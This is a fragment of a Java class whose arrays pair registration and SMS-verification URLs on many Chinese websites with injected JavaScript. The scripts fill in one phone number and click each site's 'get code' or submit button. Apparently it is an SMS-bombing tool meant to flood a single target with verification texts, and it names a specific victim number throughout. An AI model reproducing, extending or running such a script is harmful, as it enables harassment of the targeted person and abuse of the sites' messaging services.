...
public class Data {
	...
	//		+"var ele = document.getElementById(\"obtainMobileAuthCode\");"+"ele.click();",
			...
			+"var ele =document.getElementById(\"txt_password1\");ele.value = 12342134;var ele = document.getElementById(\"submitSMS\");ele.click();var ele =document.getElementById(\"btnSendVCode\");"+"ele.click();",
			...
			+"var ele = document.getElementById(\"get_checkcode\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"phone_num_input\");"+"ele.value = 13538805451;"		//29
			+"var ele = document.getElementById(\"valid_code_btn\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"txt_mobile\");"+"ele.value = 13538805451;"		//30
			+"var ele = document.getElementById(\"btnGetCode\");"+"ele.click();",
			...
			+"var ele = document.getElementById(\"getmcode\");"+"ele.click();",
			...
			+"var ele = document.getElementById(\"ImageButton1\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"getMobile\");"+"ele.value = 13538805451;"		//37
			+"var ele = document.getElementById(\"getcodebutton\");"+"ele.click();",
			...
			+"var ele = document.getElementById(\"get\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"phone\");"+"ele.value = 13538805451;"		//40
			+"var ele = document.getElementById(\"getPhoneMsg\");"+"ele.click();",
			...
			+"var ele = document.getElementById(\"HQDX_BTN\");"+"ele.click();"		
	};
	public String url[] = {
	...
	//		"http://highso.cn/customerRegister/showRegister.do",		//19
			...
			"http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=13538805451&isCheckCode=1",		//22
			...
			"http://www.guahao.com/register/mobile",	//28
			"http://chinatelecom.zc.qq.com/ ",		//29
			"http://esf.fs.fang.com/loginnew1.aspx",		//30
			"http://i.qichetong.com/authenservice/register/default.aspx",		//31
			"http://user.52callme.com/regphone.aspx  ",		//32
			"https://person.huggies.com.cn/reg/",		//33
			"http://www.uwewe.com/register.aspx",		//34
			"http://i.360.cn/reg/?src=pcw_i360&destUrl=http%3A%2F%2Fi.360.cn%2F&sb_param=1139149c58f9fa3dfaa702834e43ab0b",		//35
			"http://www.66call.com/register.aspx",		//36
			"http://reg.renren.com/xn6218.do?ss=10131&rt=1",		//37
			"http://wap.skywldh.com/wap/index.act",		//38
